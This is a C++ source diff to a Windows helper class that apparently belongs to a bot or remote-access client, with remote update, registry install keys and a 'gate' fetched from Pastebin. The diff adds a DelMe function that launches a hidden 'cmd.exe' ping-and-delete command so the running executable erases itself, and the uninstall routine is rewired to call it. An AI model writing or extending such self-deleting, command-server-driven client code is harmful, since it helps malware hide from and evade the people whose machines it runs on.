@@ -2,6 +2,8 @@
 #include <iostream>
 #include <fstream>
 #include <LM.h>
+#include <strsafe.h>
+#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
 
 class Helpers
 {
@@ -69,6 +71,23 @@ class Helpers
 			}
 
 			return winver;
+		}
+
+		static void DelMe()
+		{
+			TCHAR szModuleName[MAX_PATH];
+			TCHAR szCmd[2 * MAX_PATH];
+			STARTUPINFO si = { 0 };
+			PROCESS_INFORMATION pi = { 0 };
+
+			GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+			StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+
+			CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+			CloseHandle(pi.hThread);
+			CloseHandle(pi.hProcess);
 		}
 
 		static bool GetWinMajorMinorVersion(DWORD& major, DWORD& minor) {
@@ -310,14 +329,7 @@ class Helpers
 
 		static void uninstall() {
 			removeRegInstallKey();
-			std::string remove = " /C \"PING.EXE -n 5 127.0.0.1 && del " + ExePath() + "\"";
-			ShellExecute(
-				NULL,
-				_T("open"),
-				_T("cmd"),
-				_T(remove.c_str()), // params                            
-				_T(" C:\ "),
-				SW_HIDE);
+			DelMe();
 		}
 
 		static void update(std::string url) {
@@ -356,6 +368,9 @@ class Helpers
 			free(gateFromPatebin);
 			return responseFromGateString;
 		}
+
+
+
 };
 
 
